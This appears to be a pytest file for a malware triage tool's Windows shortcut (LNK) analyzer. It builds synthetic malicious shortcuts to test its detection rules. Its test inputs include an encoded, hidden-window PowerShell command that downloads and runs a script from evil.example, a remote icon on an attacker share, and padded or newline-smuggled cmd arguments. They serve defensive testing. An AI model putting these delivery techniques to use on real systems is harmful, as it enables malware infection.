import base64

from tollgate import lnk_analyzer as L
from tollgate import triage
from tollgate.models import Severity
from tests.helpers import CODE, build_lnk, build_pe

CMD = r"C:\Windows\System32\cmd.exe"
PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


def ids(findings):
    return {f.rule_id for f in findings}


def run(data):
    return L.analyze(data)


def test_parse_structure():
    d = build_lnk(target=CMD, args="/c echo hi", name="desc", workdir=r"C:\Temp", icon=r"C:\Windows\System32\shell32.dll",
                  machine="DESKTOP-T1", mac="aa:bb:cc:dd:ee:ff", idlist=["C:\\", "Windows", "cmd.exe"], env_target=CMD)
    assert triage.detect_type(d) == "lnk"
    info, warnings = L.parse(d)
    assert warnings == [] and info["target"] == CMD and info["arguments"] == "/c echo hi"
    assert info["name"] == "desc" and info["working_dir"] == r"C:\Temp" and info["env_target"] == CMD
    assert info["idlist_path"] == r"C:\Windows\cmd.exe"
    assert info["tracker"]["machine_id"] == "DESKTOP-T1" and info["tracker"]["file_guid_mac"] == "aa:bb:cc:dd:ee:ff"
    assert info["structure_end"] == len(d) and info["trailing"] == b""


def test_benign_shortcut_is_quiet():
    f, meta, art = run(build_lnk(target=r"C:\Windows\notepad.exe", args="C:\\notes.txt", machine="PC1"))
    assert f == [] and art == [] and meta["target"].endswith("notepad.exe")


def test_encoded_powershell():
    cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
    enc = base64.b64encode(cmd.encode("utf-16le")).decode()
    f, meta, art = run(build_lnk(target=PS, args=f"-NoP -W Hidden -Enc {enc}", show=7))
    assert {"LNK_LOLBIN_TARGET", "LNK_HIDDEN_WINDOW", "LNK_ARG_PS_ENCODED", "LNK_ARG_PS_HIDDEN", "LNK_ARG_PS_DOWNLOAD"} <= ids(f)
    assert "evil.example" in meta["decoded_command"] and meta["urls"] == ["http://evil.example/a.ps1"]
    assert art and b"DownloadString" in art[0][1]


def test_padding_and_newline():
    f, _, _ = run(build_lnk(target=CMD, args="/c echo ok" + " " * 300 + "& calc"))
    assert {"LNK_ARG_PADDING", "LNK_ARG_LONG"} <= ids(f)
    f, _, _ = run(build_lnk(target=CMD, args="/c echo ok\r\ncalc"))
    assert "LNK_ARG_NEWLINE" in ids(f)


def test_icon_spoof_and_remote_icon():
    f, _, _ = run(build_lnk(target=CMD, args="/c calc", icon=r"C:\Windows\System32\shell32.dll"))
    assert "LNK_ICON_SPOOF" in ids(f)
    f, _, _ = run(build_lnk(target=r"C:\Windows\notepad.exe", icon=r"\\attacker.example\share\i.ico"))
    sev = {x.rule_id: x.severity for x in f}
    assert sev["LNK_REMOTE_ICON"] == Severity.HIGH


def test_unc_and_webdav_targets():
    f, meta, _ = run(build_lnk(unc=r"\\srv.example\share\evil.exe"))
    assert "LNK_REMOTE_PATH" in ids(f) and meta["target"].startswith("\\\\srv.example")
    f, _, _ = run(build_lnk(target=r"\\srv.example@SSL\DavWWWRoot\x.exe"))
    assert "LNK_WEBDAV" in ids(f)


def test_appended_payload_is_high_and_extracted():
    pe = build_pe([(".text", b"\x90" * 300, CODE)])
    f, meta, art = run(build_lnk(target=CMD, args="/c x", trailing=pe))
    top = next(x for x in f if x.rule_id == "LNK_APPENDED_DATA")
    assert top.severity == Severity.HIGH and "pe" in top.detail
    assert art[-1][1] == pe.rstrip(b"\x00") and meta["appended_bytes"] == len(pe.rstrip(b"\x00"))
    f, _, _ = run(build_lnk(target=CMD, args="/c x", trailing=b"\x00" * 500))
    assert "LNK_APPENDED_DATA" not in ids(f)           # zero padding is not a payload


def test_target_field_mismatch_and_no_timestamps():
    f, _, _ = run(build_lnk(target=r"C:\Windows\notepad.exe", env_target=CMD, zero_times=True))
    assert {"LNK_TARGET_MISMATCH", "LNK_NO_TIMESTAMPS"} <= ids(f)


def test_malformed_and_truncated():
    good = build_lnk(target=CMD, args="/c echo hi")
    f, _, _ = run(good[:120])
    assert "LNK_MALFORMED" in ids(f)
    f, _, _ = run(b"\x4c\x00\x00\x00" + b"\x00" * 10)
    assert "LNK_MALFORMED" in ids(f)


def test_hostile_strings_are_sanitised():
    f, meta, _ = run(build_lnk(target=CMD, args="/c echo \u202e\x07 hi"))
    assert "\u202e" not in meta["arguments"] and "\\u{202e}" in meta["arguments"]


def test_engine_end_to_end_malicious_lnk():
    from tollgate.db import Store
    from tollgate.engine import analyze_bytes
    cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')"
    enc = base64.b64encode(cmd.encode("utf-16le")).decode()
    data = build_lnk(target=PS, args=f"-NoP -W Hidden -Enc {enc}", show=7, icon=r"C:\Windows\System32\shell32.dll")
    store = Store(":memory:")
    r = analyze_bytes(data, "Invoice.pdf.lnk", store)
    assert r.verdict == "Malicious" and "lnk" in r.metadata
    assert {"NAME_DOUBLE_EXT", "LNK_ARG_PS_ENCODED", "LNK_ICON_SPOOF"} <= {f.rule_id for f in r.findings}
    assert r.metadata["artifacts"][0]["label"] == "decoded PowerShell command"
    # intel on a domain only present INSIDE the encoded command still fires
    store.add_ioc("domain", "evil.example", family="Demo", source="unit")
    r2 = analyze_bytes(data, "Invoice.pdf.lnk", store)
    assert "INTEL_URL_MATCH" in {f.rule_id for f in r2.findings}


def test_safe_marks_truncation_only_when_text_is_cut():
    from tollgate.textutil import safe
    assert safe("a" * 64, 64) == "a" * 64 and safe("a" * 65, 64) == "a" * 64 + "..."
    assert safe(None) == "" and safe("x\u202ey", 10) == "x\\u{202e}y"
